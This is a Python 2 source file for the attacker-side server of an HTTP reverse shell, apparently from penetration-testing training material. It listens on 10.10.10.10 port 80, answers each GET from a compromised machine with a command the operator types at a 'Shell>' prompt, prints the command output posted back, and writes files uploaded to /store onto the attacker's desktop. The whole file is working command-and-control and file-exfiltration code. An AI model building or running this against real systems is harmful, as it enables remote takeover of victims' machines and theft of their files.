#Server

import BaseHTTPServer   # Built-in HTTP library
import os,cgi

HOST_NAME = '10.10.10.10'   # Host IP address
PORT_NUMBER = 80   # Listening port number 


class MyHandler(BaseHTTPServer.BaseHTTPRequestHandler): 

    def do_GET(s):
                                        
        command = raw_input("Shell> ")   #Take user input
        s.send_response(200)             #HTML status 200 (OK)
        s.send_header("Content-type", "text/html")  
        s.end_headers()
        s.wfile.write(command)           #send the command which we got from the user input

            
    def do_POST(s):

        if s.path=='/store':        #Check whether /store is appended or not
            try:
                ctype,pdict=cgi.parse_header(s.headers.getheader('content-type'))
                if ctype=='multipart/form-data':
                    fs=cgi.FieldStorage(fp=s.rfile,headers=s.headers,environ={'REQUEST_METHOD':'POST'})
                else:
                    print "[-] Unexpected POST request"
                fs_up=fs['file']                #Here file is the key to hold the actual file
                with open('/root/Desktop/demo.txt','wb') as o:  #Create new file and write contents into this file
                    o.write(fs_up.file.read())
                    s.send_response(200)
                    s.end_headers()
            except Exception as e:
                    print e
            return 
        s.send_response(200)                        
        s.end_headers()
        length  = int(s.headers['Content-Length'])   #Define the length which means how many bytes the HTTP POST data contains                                              
        postVar = s.rfile.read(length)               # Read then print the posted data
        print postVar
        
        

if __name__ == '__main__':    
    
    server_class = BaseHTTPServer.HTTPServer
    httpd = server_class((HOST_NAME, PORT_NUMBER), MyHandler)
 
    try:     
        httpd.serve_forever()   #if we got ctrl+c we will Interrupt and stop the server
    except KeyboardInterrupt:   
        print '[!] Server is terminated'
        httpd.server_close()

